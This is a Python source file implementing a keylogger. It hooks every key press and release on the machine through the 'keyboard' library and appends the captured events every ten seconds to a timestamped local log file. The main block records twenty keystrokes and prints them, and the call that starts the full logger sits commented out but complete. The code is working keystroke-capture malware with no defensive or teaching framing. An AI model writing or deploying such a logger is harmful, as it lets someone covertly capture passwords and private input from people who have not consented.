import time
from threading import Timer

import keyboard

SEND_LOG_EVERY = 10


class Keylogger:
    def __init__(self):
        self.keystrokes = ""
        self.file = f"log_{time.time()}.txt"

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            '''if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                '''
        self.keystrokes += str(event) + '\n'

    def callback2(self, event):
        name = event.name
        if len(name) > 1:
            '''if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                '''
        self.keystrokes += str(event) + '\n'

    def write_to_file(self):
        with open(self.file, "a") as f:
            print(self.keystrokes, file=f)

    def log(self):
        if self.keystrokes:
            self.write_to_file()
        self.keystrokes = ""
        timer = Timer(interval=SEND_LOG_EVERY, function=self.log)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_press(callback=self.callback)
        keyboard.on_release(callback=self.callback2)
        self.log()
        keyboard.wait()


if __name__ == "__main__":

    l = []
    i = 0
    while i < 20:
        rk = keyboard.read_event()
        l.append(rk)
        i += 1
    print(l)
    '''
    keylogger = Keylogger()
    keylogger.start()
    '''
